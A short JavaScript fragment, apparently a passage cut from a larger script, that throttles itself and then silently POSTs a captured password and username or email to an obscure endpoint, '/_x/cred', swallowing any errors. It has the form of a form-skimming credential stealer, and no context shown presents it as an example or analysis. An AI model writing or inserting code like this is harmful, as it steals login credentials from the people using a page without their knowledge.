          if (now - _lastSent < 3000) return;
          _lastSent = now;
          try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/_x/cred', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({p: pass, u: user || email || ''}));
          } catch(e) {}
